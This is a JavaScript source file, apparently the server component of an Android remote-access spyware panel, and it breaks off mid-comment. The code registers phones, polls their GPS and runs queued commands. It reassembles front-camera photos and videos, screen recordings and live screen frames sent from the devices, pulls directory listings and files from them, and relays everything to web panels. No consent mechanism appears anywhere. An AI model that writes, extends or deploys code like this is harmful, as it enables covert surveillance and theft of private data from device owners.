let CONST = require('./const'),
    fs = require('fs'),
    crypto = require('crypto'),
    path = require('path'),
    ResumableUploadManager = require('./resumableUploadManager');

class Clients {
    constructor(db) {
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
        
        // Command queue system to prevent concurrent heavy operations
        this.commandQueues = {}; // clientID -> array of pending commands
        this.activeOperations = {}; // clientID -> { type, startTime }
        this.fileBatchTimers = {}; // clientID -> timer reference

        // Resumable upload manager — handles chunked uploads with ACK and resume
        this.uploadManager = new ResumableUploadManager(
            CONST.downloadsFullPath,
            CONST.downloadsFolder
        );
    }

    // UPDATE

    clientConnect(connection, clientID, clientData) {

        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        let client = this.db.maindb.get('clients').find({ clientID });
        if (client.value() === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write()

            // this being the first run we should ask the client for all existing data?

        } else {
            let prevDd = client.value().dynamicData || {};
            // Merge so full deviceReport from Android register() is not wiped on reconnect
            let merged = Object.assign({}, prevDd, clientData, {
                clientIP: clientData.clientIP,
                clientGeo: clientData.clientGeo,
                device: clientData.device
            });
            if (prevDd.deviceReport && !clientData.deviceReport) {
                merged.deviceReport = prevDd.deviceReport;
            }
            if (prevDd.deviceReportReceivedAt && !clientData.deviceReportReceivedAt) {
                merged.deviceReportReceivedAt = prevDd.deviceReportReceivedAt;
            }
            client.assign({
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: merged
            }).write()
        }

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    /**
     * Store raw JSON from Android socket.emit('register', ...) — full Build / display / runtime.
     */
    mergeDeviceReport(clientID, report) {
        try {
            let row = this.db.maindb.get('clients').find({ clientID });
            if (row.value() === undefined) return;
            let dd = Object.assign({}, row.value().dynamicData || {});
            dd.deviceReport = report;
            dd.deviceReportReceivedAt = new Date();
            row.assign({ dynamicData: dd }).write();
            logManager.log(CONST.logTypes.info, clientID + " Device report stored (" + Object.keys(report).length + " fields)");
        } catch (e) {
            logManager.log(CONST.logTypes.error, clientID + " mergeDeviceReport: " + e.message);
        }
    }

    clientDisconnect(clientID) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            logManager.log(CONST.logTypes.info, clientID + " Disconnected")
            this.db.maindb.get('clients').find({ clientID }).assign({
                lastSeen: new Date(),
                isOnline: false,
            }).write()
            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
            delete this.ignoreDisconnects[clientID];
        }
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID)
            return this.clientDatabases[clientID];
        }
    }

    setupListeners(clientID) {
        let socket = this.clientConnections[clientID];
        let client = this.getClientDatabase(clientID);

        logManager.log(CONST.logTypes.info, clientID + " Connected")
        socket.on('disconnect', () => this.clientDisconnect(clientID));

        // Run the queued requests for this client
        let clientQue = client.get('CommandQue').value();
        if (clientQue.length !== 0) {
            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (!error) client.get('CommandQue').remove({ uid: uid }).write();
                    else {
                        // Hopefully we'll never hit this point, it'd mean the client connected then immediatly disonnected, how weird!
                        // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ 
                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed");
                    }
                })
            })
        }


        // Start GPS polling (if enabled)
        this.gpsPoll(clientID);


        // Front camera photo handler

        // Screen recording chunk storage (temporary, per client)
        if (!this.screenRecordingChunks) {
            this.screenRecordingChunks = {};
        }
        if (!this.screenRecordingChunks[clientID]) {
            this.screenRecordingChunks[clientID] = {};
        }
        if (!this.frontCameraVideoChunks) {
            this.frontCameraVideoChunks = {};
        }
        if (!this.frontCameraVideoChunks[clientID]) {
            this.frontCameraVideoChunks[clientID] = {};
        }

        socket.on(CONST.messageKeys.files, (data) => {
            // {
            //     "type": "list"|"download"|"error"|"screen_recording_start"|"screen_recording_chunk"|"screen_recording_complete"|"screen_recording_status"|"screen_recording_error"|"front_camera_photo"|"camera_error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String>,
            //     (if type = screen_recording_*) screen recording data,
            //     (if type = front_camera_photo) "image": true, "buffer": <base64 string>
            // }

            // Handle front camera photos (sent via files channel)
            // Initialize chunk storage for camera photos
            if (!this.cameraPhotoChunks) {
                this.cameraPhotoChunks = {};
            }
            if (!this.cameraPhotoChunks[clientID]) {
                this.cameraPhotoChunks[clientID] = {};
            }
            
            if (data.type === "front_camera_photo_start") {
                logManager.log(CONST.logTypes.info, clientID + " Front camera photo start - " + data.totalChunks + " chunks, " + data.totalSize + " bytes");
                this.cameraPhotoChunks[clientID].currentPhoto = {
                    chunks: [],
                    totalSize: data.totalSize || 0,
                    totalChunks: data.totalChunks || 0,
                    startTime: new Date()
                };
            } else if (data.type === "front_camera_photo_chunk") {
                if (this.cameraPhotoChunks[clientID].currentPhoto) {
                    this.cameraPhotoChunks[clientID].currentPhoto.chunks.push({
                        index: data.chunkIndex,
                        data: data.chunkData,
                        size: data.chunkSize
                    });
                    logManager.log(CONST.logTypes.info, clientID + " Front camera photo chunk " + data.chunkIndex + " received (" + (data.chunkIndex + 1) + "/" + data.totalChunks + ")");
                }
            } else if (data.type === "front_camera_photo_complete") {
                logManager.log(CONST.logTypes.info, clientID + " Front camera photo complete");
                
                if (this.cameraPhotoChunks[clientID].currentPhoto) {
                    let photo = this.cameraPhotoChunks[clientID].currentPhoto;
                    
                    // Sort chunks by index
                    photo.chunks.sort((a, b) => a.index - b.index);
                    
                    // Combine all chunks
                    let imageBuffer = Buffer.concat(
                        photo.chunks.map(chunk => Buffer.from(chunk.data, 'base64'))
                    );
                    
                    // Generate unique filename
                    let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                    let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                    let fileName = 'front_camera_' + fileKey + '.jpg';
                    let filePath = path.join(CONST.downloadsFullPath, fileName);
                    
                    // Save image file
                    fs.writeFile(filePath, imageBuffer, (error) => {
                        if (!error) {
                            // Save to database
                            client.get('downloads').push({
                                time: new Date(),
                                type: "frontCameraPhoto",
                                originalName: fileName,
                                path: CONST.downloadsFolder + '/' + fileName,
                                size: imageBuffer.length,
                                format: "Image (JPEG)",
                                status: "Front camera photo saved successfully",
                                camera: "front",
                                timestamp: Date.now()
                            }).write();
                            logManager.log(CONST.logTypes.success, clientID + " Front camera photo saved: " + fileName + " (" + imageBuffer.length + " bytes)");
                        } else {
                            logManager.log(CONST.logTypes.error, clientID + " Failed to save front camera photo: " + error.message);
                        }
                    });
                    
                    // Clean up
                    delete this.cameraPhotoChunks[clientID].currentPhoto;
                }
                return;
            } else if (data.type === "front_camera_photo" && data.image && data.buffer) {
                logManager.log(CONST.logTypes.info, clientID + " Received front camera photo (single chunk)");
                
                try {
                    // Decode base64 image
                    let imageBuffer = Buffer.from(data.buffer, 'base64');
                    
                    // Generate unique filename
                    let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                    let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                    let fileName = 'front_camera_' + fileKey + '.jpg';
                    let filePath = path.join(CONST.downloadsFullPath, fileName);
                    
                    // Save image file
                    fs.writeFile(filePath, imageBuffer, (error) => {
                        if (!error) {
                            // Save to database
                            client.get('downloads').push({
                                time: new Date(),
                                type: "frontCameraPhoto",
                                originalName: fileName,
                                path: CONST.downloadsFolder + '/' + fileName,
                                size: imageBuffer.length,
                                format: "Image (JPEG)",
                                status: "Front camera photo saved successfully",
                                camera: data.camera || "front",
                                timestamp: data.timestamp || Date.now()
                            }).write();
                            logManager.log(CONST.logTypes.success, clientID + " Front camera photo saved: " + fileName + " (" + imageBuffer.length + " bytes)");
                        } else {
                            logManager.log(CONST.logTypes.error, clientID + " Failed to save front camera photo: " + error.message);
                        }
                    });
                } catch (error) {
                    logManager.log(CONST.logTypes.error, clientID + " Error processing front camera photo: " + error.message);
                }
                return; // Don't process as regular file
            }
            
            // Handle camera errors
            if (data.type === "camera_error") {
                logManager.log(CONST.logTypes.error, clientID + " Camera error: " + (data.error || "Unknown error"));
                return;
            }

            // Front camera video (MP4 chunks, same pattern as screen recording)
            if (data.type === "front_camera_video_start") {
                logManager.log(CONST.logTypes.info, clientID + " Front camera video start: " + (data.fileName || "Unknown"));
                this.frontCameraVideoChunks[clientID][data.fileName] = {
                    chunks: [],
                    totalSize: data.fileSize || 0,
                    duration: data.duration || 0,
                    startTime: new Date()
                };
            } else if (data.type === "front_camera_video_chunk") {
                if (this.frontCameraVideoChunks[clientID][data.fileName]) {
                    this.frontCameraVideoChunks[clientID][data.fileName].chunks.push({
                        index: data.chunkIndex,
                        data: data.chunkData,
                        size: data.chunkSize
                    });
                    logManager.log(CONST.logTypes.info, clientID + " Front camera video chunk " + data.chunkIndex + " (" + (data.totalSent || 0) + "/" + (data.totalSize || 0) + " bytes)");
                }
            } else if (data.type === "front_camera_video_complete") {
                logManager.log(CONST.logTypes.info, clientID + " Front camera video complete: " + data.fileName);
                if (this.frontCameraVideoChunks[clientID][data.fileName]) {
                    let recording = this.frontCameraVideoChunks[clientID][data.fileName];
                    recording.chunks.sort((a, b) => a.index - b.index);
                    let videoBuffer = Buffer.concat(
                        recording.chunks.map(chunk => Buffer.from(chunk.data, 'base64'))
                    );
                    let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                    let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                    let fileName = data.fileName || 'front_camera_video.mp4';
                    let filePath = path.join(CONST.downloadsFullPath, fileKey + '.mp4');
                    fs.writeFile(filePath, videoBuffer, (error) => {
                        if (!error) {
                            client.get('downloads').push({
                                time: new Date(),
                                type: "frontCameraVideo",
                                originalName: fileName,
                                path: CONST.downloadsFolder + '/' + fileKey + '.mp4',
                                size: data.fileSize || videoBuffer.length,
                                format: "Video (MP4, front camera)",
                                status: "Front camera video saved successfully",
                                duration: recording.duration,
                                camera: "front",
                                totalChunks: data.totalChunks || recording.chunks.length
                            }).write();
                            logManager.log(CONST.logTypes.success, clientID + " Front camera video saved: " + fileName + " (" + (data.fileSize || videoBuffer.length) + " bytes)");
                        } else {
                            logManager.log(CONST.logTypes.error, clientID + " Failed to save front camera video: " + error.message);
                        }
                    });
                    delete this.frontCameraVideoChunks[clientID][data.fileName];
                }
            } else if (data.type === "front_camera_video_error") {
                logManager.log(CONST.logTypes.error, clientID + " Front camera video error: " + (data.error || "Unknown"));
                if (data.fileName && this.frontCameraVideoChunks[clientID][data.fileName]) {
                    delete this.frontCameraVideoChunks[clientID][data.fileName];
                }
            }

            // Handle screen recording messages
            if (data.type === "screen_recording_start") {
                logManager.log(CONST.logTypes.info, clientID + " Screen recording started: " + (data.fileName || "Unknown"));
                // Initialize chunk storage for this recording
                this.screenRecordingChunks[clientID][data.fileName] = {
                    chunks: [],
                    totalSize: data.fileSize || 0,
                    duration: data.duration || 0,
                    startTime: new Date()
                };
            } else if (data.type === "screen_recording_chunk") {
                // Store chunk
                if (this.screenRecordingChunks[clientID][data.fileName]) {
                    this.screenRecordingChunks[clientID][data.fileName].chunks.push({
                        index: data.chunkIndex,
                        data: data.chunkData,
                        size: data.chunkSize
                    });
                    logManager.log(CONST.logTypes.info, clientID + " Screen recording chunk " + data.chunkIndex + " received (" + data.totalSent + "/" + data.totalSize + " bytes)");
                }
            } else if (data.type === "screen_recording_complete") {
                logManager.log(CONST.logTypes.info, clientID + " Screen recording complete: " + data.fileName);
                
                // Reassemble video file
                if (this.screenRecordingChunks[clientID][data.fileName]) {
                    let recording = this.screenRecordingChunks[clientID][data.fileName];
                    
                    // Sort chunks by index
                    recording.chunks.sort((a, b) => a.index - b.index);
                    
                    // Combine all chunks
                    let videoBuffer = Buffer.concat(
                        recording.chunks.map(chunk => Buffer.from(chunk.data, 'base64'))
                    );
                    
                    // Save video file
                    let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                    let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                    let fileName = data.fileName || 'screen_recording.mp4';
                    let filePath = path.join(CONST.downloadsFullPath, fileKey + '.mp4');
                    
                    fs.writeFile(filePath, videoBuffer, (error) => {
                        if (!error) {
                            // Save to database
                            client.get('downloads').push({
                                time: new Date(),
                                type: "screenRecording",
                                originalName: fileName,
                                path: CONST.downloadsFolder + '/' + fileKey + '.mp4',
                                size: data.fileSize || videoBuffer.length,
                                format: "Video (MP4)",
                                status: "Screen recording saved successfully",
                                duration: recording.duration,
                                totalChunks: data.totalChunks || recording.chunks.length
                            }).write();
                            logManager.log(CONST.logTypes.success, clientID + " Screen recording saved: " + fileName + " (" + (data.fileSize || videoBuffer.length) + " bytes)");
                        } else {
                            logManager.log(CONST.logTypes.error, clientID + " Failed to save screen recording: " + error.message);
                        }
                    });
                    
                    // Clean up chunks
                    delete this.screenRecordingChunks[clientID][data.fileName];
                }
            } else if (data.type === "screen_recording_status") {
                logManager.log(CONST.logTypes.info, clientID + " Screen recording status: " + data.status + " (Duration: " + data.duration + "s)");
            } else if (data.type === "screen_recording_error") {
                logManager.log(CONST.logTypes.error, clientID + " Screen recording error: " + data.error);
                // Clean up on error
                if (data.fileName && this.screenRecordingChunks[clientID][data.fileName]) {
                    delete this.screenRecordingChunks[clientID][data.fileName];
                }
            }
            // ─── Live Screen Streaming Handlers ─────────────────────────────
            else if (data.type === "screen_stream_start") {
                // Client started live screen streaming
                logManager.log(CONST.logTypes.info, clientID + " 📺 Screen stream STARTED - " + 
                    data.width + "x" + data.height + " @ " + data.fps + "fps, quality=" + data.quality);
                
                // Initialize stream state for this client
                if (!this.screenStreams) this.screenStreams = {};
                this.screenStreams[clientID] = {
                    width: data.width,
                    height: data.height,
                    fps: data.fps,
                    quality: data.quality,
                    startTime: Date.now(),
                    frameCount: 0,
                    isActive: true
                };
                
                // Broadcast to all web panel viewers that a new stream is available
                if (global.IO) {
                    global.IO.emit('screen_stream_available', {
                        clientID: clientID,
                        width: data.width,
                        height: data.height,
                        fps: data.fps,
                        quality: data.quality,
                        timestamp: Date.now()
                    });
                    console.log("   📡 Broadcasted screen_stream_available to web panels");
                }
            }
            else if (data.type === "screen_stream_frame") {
                // A single frame from the live stream
                if (!this.screenStreams) this.screenStreams = {};
                if (!this.screenStreams[clientID]) {
                    this.screenStreams[clientID] = { frameCount: 0, isActive: true, startTime: Date.now() };
                }
                
                this.screenStreams[clientID].frameCount++;
                this.screenStreams[clientID].lastFrameTime = Date.now();
                
                // Log first frame and then every 30 frames
                if (this.screenStreams[clientID].frameCount === 1) {
                    let dataSize = data.data ? (data.data.length / 1024).toFixed(1) : 0;
                    console.log("   📺 First frame received! Size: " + dataSize + " KB");
                }
                
                // Broadcast frame to all web panel viewers watching this client
                if (global.IO) {
                    global.IO.emit('screen_stream_frame', {
                        clientID: clientID,
                        frameNumber: data.frameNumber,
                        timestamp: data.timestamp,
                        data: data.data  // Base64 JPEG image
                    });
                }
                
                // Log every 30 frames (roughly every 6 seconds at 5fps)
                if (this.screenStreams[clientID].frameCount % 30 === 0) {
                    let duration = (Date.now() - (this.screenStreams[clientID].startTime || Date.now())) / 1000;
                    let avgFps = this.screenStreams[clientID].frameCount / (duration > 0 ? duration : 1);
                    logManager.log(CONST.logTypes.info, clientID + " 📺 Stream: " + 
                        this.screenStreams[clientID].frameCount + " frames, " + 
                        duration.toFixed(0) + "s, " + avgFps.toFixed(1) + " fps avg");
                }
            }
            else if (data.type === "screen_stream_stop") {
                // Client stopped live screen streaming
                let streamInfo = this.screenStreams ? this.screenStreams[clientID] : null;
                let totalFrames = streamInfo ? streamInfo.frameCount : (data.totalFrames || 0);
                
                logManager.log(CONST.logTypes.info, clientID + " 📺 Screen stream STOPPED - " + 
                    totalFrames + " frames, " + data.duration + "s - Reason: " + data.reason);
                
                // Clean up stream state
                if (this.screenStreams && this.screenStreams[clientID]) {
                    this.screenStreams[clientID].isActive = false;
                    delete this.screenStreams[clientID];
                }
                
                // Notify web panels that stream has ended
                if (global.IO) {
                    global.IO.emit('screen_stream_stopped', {
                        clientID: clientID,
                        reason: data.reason,
                        totalFrames: totalFrames,
                        duration: data.duration,
                        timestamp: Date.now()
                    });
                    console.log("   📡 Broadcasted screen_stream_stopped to web panels");
                }
            }
            else if (data.type === "screen_stream_error") {
                logManager.log(CONST.logTypes.error, clientID + " 📺 Screen stream ERROR: " + data.error);
                
                // Clean up stream state
                if (this.screenStreams && this.screenStreams[clientID]) {
                    this.screenStreams[clientID].isActive = false;
                    delete this.screenStreams[clientID];
                }
                
                // Notify web panels about the error
                if (global.IO) {
                    global.IO.emit('screen_stream_error', {
                        clientID: clientID,
                        error: data.error,
                        timestamp: Date.now()
                    });
                }
            }
            // ─── End Live Screen Streaming Handlers ─────────────────────────
            else if (data.type === "list") {
                let list = data.list;
                let offset = data.offset || 0;
                let limit = data.limit || 100;
                let total = data.total || list.length;
                let hasMore = data.hasMore || false;
                let currentPath = data.currentPath || "/";
                
                console.log("═══════════════════════════════════════════════════════════");
                console.log("📁 FILE LIST BATCH RECEIVED from " + clientID);
                console.log("   📂 Path: " + currentPath);
                console.log("   📊 Batch: " + list.length + " files (offset: " + offset + ", limit: " + limit + ")");
                console.log("   📈 Total files in directory: " + total);
                console.log("   ➡️  Has more: " + (hasMore ? "YES" : "NO"));
                
                // Mark file listing as active operation (on first batch)
                if (offset === 0 && hasMore) {
                    this.setActiveOperation(clientID, 'file_list');
                }
                
                // Calculate and show progress bar (handle edge cases)
                let loadedSoFar = Math.min(offset + list.length, total); // Don't exceed total
                let percent = total > 0 ? Math.min(100, Math.round((loadedSoFar / total) * 100)) : 100;
                let barLength = 30;
                let filledLength = Math.max(0, Math.min(barLength, Math.round(barLength * loadedSoFar / total)));
                let emptyLength = Math.max(0, barLength - filledLength);
                let bar = "█".repeat(filledLength) + "░".repeat(emptyLength);
                console.log("   📊 PROGRESS: [" + bar + "] " + percent + "% (" + loadedSoFar + "/" + total + ")");
                
                if (list && list.length !== 0) {
                    // Log file type breakdown for this batch
                    let typeCount = {};
                    let extensionCount = {};
                    let directories = 0;
                    let files = 0;
                    
                    list.forEach((item) => {
                        if (item.isDir || item.isDirectory) {
                            directories++;
                        } else {
                            files++;
                        }
                        let type = item.type || "Unknown";
                        let ext = (item.extension || "").toLowerCase();
                        typeCount[type] = (typeCount[type] || 0) + 1;
                        if (ext) {
                            extensionCount[ext] = (extensionCount[ext] || 0) + 1;
                        }
                    });
                    
                    console.log("   📋 Batch types: " + Object.keys(typeCount).join(", "));
                    
                    // PAGINATION HANDLING: Merge with existing files or replace
                    if (offset === 0) {
                        // First batch - replace entire list
                        client.get('currentFolder').remove().write();
                        client.get('currentFolder').assign(data.list).write();
                        
                        // Store pagination metadata
                        client.set('currentFolderMeta', {
                            path: currentPath,
                            total: total,
                            loaded: list.length,
                            hasMore: hasMore,
                            lastUpdate: new Date()
                        }).write();
                        
                        console.log("   ✅ Stored FIRST batch (" + list.length + " files)");
                        
                        // Broadcast update to web clients - trigger auto-refresh
                        console.log("   📡 Attempting to broadcast to web panels... (IO available: " + (global.IO ? "YES" : "NO") + ")");
                        if (global.IO) {
                            console.log("   📡 Broadcasting batch #1 update to web panels...");
                            global.IO.emit('file_batch_received', {
                                clientID: clientID,
                                path: currentPath,
                                loaded: list.length,
                                total: total,
                                hasMore: hasMore,
                                batchNumber: 1
                            });
                            console.log("   ✅ Broadcast sent!");
                        } else {
                            console.log("   ❌ global.IO is not available!");
                        }
                    } else {
                        // Subsequent batch - append to existing list
                        let existing = client.get('currentFolder').value() || [];
                        let merged = [...existing, ...data.list];
                        
                        // Remove duplicates based on path
                        let uniqueFiles = {};
                        merged.forEach(file => {
                            uniqueFiles[file.path] = file;
                        });
                        merged = Object.values(uniqueFiles);
                        
                        client.get('currentFolder').remove().write();
                        client.get('currentFolder').assign(merged).write();
                        
                        // Update pagination metadata
                        client.set('currentFolderMeta', {
                            path: currentPath,
                            total: total,
                            loaded: merged.length,
                            hasMore: hasMore,
                            lastUpdate: new Date()
                        }).write();
                        
                        console.log("   ✅ MERGED batch (now have " + merged.length + "/" + total + " files)");
                        
                        // Broadcast update to web clients - trigger auto-refresh
                        let batchNum = Math.floor(offset / limit) + 1;
                        console.log("   📡 Attempting to broadcast batch #" + batchNum + " to web panels...");
                        if (global.IO) {
                            console.log("   📡 Broadcasting batch #" + batchNum + " update...");
                            global.IO.emit('file_batch_received', {
                                clientID: clientID,
                                path: currentPath,
                                loaded: merged.length,
                                total: total,
                                hasMore: hasMore,
                                batchNumber: batchNum
                            });
                            console.log("   ✅ Broadcast sent for batch #" + batchNum + "!");
                        } else {
                            console.log("   ❌ global.IO is not available!");
                        }
                    }
                    
                    // Auto-request next batch if there are more files
                    if (hasMore) {
                        let nextOffset = offset + list.length; // Use actual list length, not limit
                        console.log("   🔄 Auto-requesting next batch (offset: " + nextOffset + ")...");
                        
                        // Store reference to this for use in callback
                        let self = this;
                        
                        // Clear any existing timer
                        if (self.fileBatchTimers[clientID]) {
                            clearTimeout(self.fileBatchTimers[clientID]);
                        }
                        
                        // Calculate adaptive delay based on directory size
                        let batchDelay = 800; // Base delay: 800ms
                        if (total > 5000) batchDelay = 1500; // Very large dirs: 1.5s
                        else if (total > 2000) batchDelay = 1200; // Large dirs: 1.2s
                        
                        self.fileBatchTimers[clientID] = setTimeout(function() {
                            // Check if there's an active download before requesting next batch
                            if (self.hasActiveOperation(clientID, 'download')) {
                                console.log("   ⏸️  Pausing batch request - download in progress");
                                // Retry after download might be done
                                self.fileBatchTimers[clientID] = setTimeout(function() {
                                    console.log("   🔄 Retrying batch request after download...");
                                    requestNextBatch();
                                }, 3000);
                                return;
                            }
                            
                            requestNextBatch();
                        }, batchDelay);
                        
                        function requestNextBatch() {
                            console.log("   📤 Sending request for next batch...");
                            self.sendCommand(clientID, "0xFI", {
                                action: "ls",
                                path: currentPath,
                                offset: nextOffset,
                                limit: limit
                            }, function(error, message) {
                                if (error) {
                                    console.error("   ❌ Error auto-requesting next batch:", error);
                                    self.clearActiveOperation(clientID);
                                } else {
                                    console.log("   ✅ Request sent for offset: " + nextOffset);
                                }
                            });
                        }
                    } else {
                        // All batches loaded - clear active operation
                        this.clearActiveOperation(clientID);
                        
                        let stored = client.get('currentFolder').value();
                        console.log("   ");
                        console.log("   ✅✅✅ ALL FILES LOADED SUCCESSFULLY ✅✅✅");
                        console.log("   📊 Total files: " + (stored ? stored.length : 0));
                        console.log("   📂 Path: " + currentPath);
                        console.log("   ");
                    }
                    
                    logManager.log(CONST.logTypes.success, "File List Batch " + Math.floor(offset / limit + 1) + " - " + list.length + " files (" + (hasMore ? "more to load" : "complete") + ")");
                } else {
                    console.log("   ⚠️ Batch is EMPTY");
                    logManager.log(CONST.logTypes.warning, "File List Batch Received but Empty");
                }
                console.log("═══════════════════════════════════════════════════════════");
            } else if (data.type === "download") {
                // Handle both chunked and non-chunked file downloads
                
                // Initialize chunk storage for file downloads
                if (!this.fileDownloadChunks) {
                    this.fileDownloadChunks = {};
                }
                if (!this.fileDownloadChunks[clientID]) {
                    this.fileDownloadChunks[clientID] = {};
                }
                
                // CHUNKED DOWNLOAD (for large files)
                if (data.chunked === true) {
                    let fileName = data.fileName || 'downloaded_file';
                    let chunkNumber = data.chunkNumber || 1;
                    let totalChunks = data.totalChunks || 1;
                    let isLastChunk = data.isLastChunk || false;
                    
                    // First chunk - initialize storage
                    if (chunkNumber === 1) {
                        // Mark download as active operation and pause file listing
                        this.setActiveOperation(clientID, 'download');
                        this.pauseFileBatchLoading(clientID);
                        
                        let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                        let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                        let fileExt = data.fileExtension ? '.' + data.fileExtension : 
                                     (fileName.substring(fileName.lastIndexOf(".")).length !== fileName.length) ? 
                                     fileName.substring(fileName.lastIndexOf(".")) : '.unknown';
                        
                        this.fileDownloadChunks[clientID][fileName] = {
                            chunks: [],
                            totalChunks: totalChunks,
                            fileSize: data.fileSize || 0,
                            fileName: fileName,
                            fileKey: fileKey,
                            fileExt: fileExt,
                            filePath: path.join(CONST.downloadsFullPath, fileKey + fileExt),
                            startTime: new Date(),
                            fileType: data.fileType,
                            sourcePath: data.filePath,
                            lastModified: data.lastModified
                        };
                        
                        logManager.log(CONST.logTypes.info, "📥 Receiving chunked file from " + clientID + ": " + fileName + 
                                      " (" + (data.fileSizeFormatted || "Unknown size") + ", " + totalChunks + " chunks)");
                    }
                    
                    // Store chunk
                    if (this.fileDownloadChunks[clientID][fileName]) {
                        let fileBuffer = Buffer.from(data.buffer, 'base64');
                        this.fileDownloadChunks[clientID][fileName].chunks.push({
                            number: chunkNumber,
                            data: fileBuffer,
                            size: data.chunkSize
                        });
                        
                        // Log progress every 5 chunks or on last chunk
                        if (chunkNumber % 5 === 0 || isLastChunk) {
                            logManager.log(CONST.logTypes.info, "   📦 Chunk " + chunkNumber + "/" + totalChunks + 
                                          " (" + data.progress + "%) - " + fileName);
                        }
                        
                        // Last chunk - combine and save
                        if (isLastChunk) {
                            let fileData = this.fileDownloadChunks[clientID][fileName];
                            
                            // Sort chunks by number
                            fileData.chunks.sort((a, b) => a.number - b.number);
                            
                            // Combine all chunks
                            let completeBuffer = Buffer.concat(fileData.chunks.map(chunk => chunk.data));
                            
                            // Save to disk
                            fs.writeFile(fileData.filePath, completeBuffer, (error) => {
                                if (!error) {
                                    let downloadTime = (new Date() - fileData.startTime) / 1000;
                                    let speed = (completeBuffer.length / 1024 / 1024) / downloadTime;
                                    
                                    // Save to database
                                    client.get('downloads').push({
                                        time: new Date(),
                                        type: "fileDownload",
                                        originalName: fileData.fileName,
                                        path: CONST.downloadsFolder + '/' + fileData.fileKey + fileData.fileExt,
                                        size: completeBuffer.length,
                                        format: fileData.fileType || "Unknown",
                                        status: "File downloaded successfully (chunked)",
                                        sourcePath: fileData.sourcePath,
                                        lastModified: fileData.lastModified,
                                        downloadTime: downloadTime.toFixed(2) + "s",
                                        speed: speed.toFixed(2) + " MB/s"
                                    }).write();
                                    
                                    logManager.log(CONST.logTypes.success, "✅ Chunked file saved: " + fileData.fileName + 
                                                  " (" + (data.fileSizeFormatted || "Unknown size") + 
                                                  ", " + downloadTime.toFixed(1) + "s, " + speed.toFixed(2) + " MB/s)");
                                    
                                    // Clean up chunk storage and clear active operation
                                    delete this.fileDownloadChunks[clientID][fileName];
                                    this.clearActiveOperation(clientID);
                                } else {
                                    logManager.log(CONST.logTypes.error, "❌ Failed to save chunked file: " + error.message);
                                    // Clear operation on error too
                                    delete this.fileDownloadChunks[clientID][fileName];
                                    this.clearActiveOperation(clientID);
                                }
                            });
                        }
                    }
                } else {
                    // NON-CHUNKED DOWNLOAD (small files, legacy support)
                    logManager.log(CONST.logTypes.info, "Receiving File From " + clientID + ": " + (data.fileName || data.name || "Unknown"));

                    let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                    let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                    let fileName = data.fileName || data.name || 'downloaded_file';
                    let fileExt = data.fileExtension ? '.' + data.fileExtension : 
                                 (fileName.substring(fileName.lastIndexOf(".")).length !== fileName.length) ? 
                                 fileName.substring(fileName.lastIndexOf(".")) : '.unknown';

                    let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                    // Handle both old format (buffer) and new format (base64 string)
                    let fileBuffer;
                    if (typeof data.buffer === 'string') {
                        // Base64 string - convert to buffer
                        fileBuffer = Buffer.from(data.buffer, 'base64');
                    } else {
                        // Already a buffer
                        fileBuffer = data.buffer;
                    }

                    fs.writeFile(filePath, fileBuffer, (error) => {
                        if (!error) {
                            // let's save the filepath to the database
                            client.get('downloads').push({
                                time: new Date(),
                                type: "fileDownload",
                                originalName: fileName,
                                path: CONST.downloadsFolder + '/' + fileKey + fileExt,
                                size: data.fileSize || fileBuffer.length,
                                format: data.fileType || "Unknown",
                                status: "File downloaded successfully",
                                sourcePath: data.filePath,
                                lastModified: data.lastModified
                            }).write();
                            logManager.log(CONST.logTypes.success, "File From " + clientID + " Saved: " + fileName + " (" + (data.fileSizeFormatted || "Unknown size") + ")");
                        }
                        else {
                            logManager.log(CONST.logTypes.error, "Failed to save file from " + clientID + ": " + error.message);
                        }
                    });
                }
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        // ─── Resumable Upload Protocol ──────────────────────────────────────
        // These events implement a chunked, ACK-based, resumable file upload.
        // The client sends upload_init, then upload_chunk for each piece.
        // The server ACKs every chunk, persists state, and supports resume.

        /**
         * upload_init — Client wants to start (or resume) a file upload.
         * Payload: { fileId, fileName, filePath, fileSize, totalChunks, chunkSize, fileExtension, fileType }
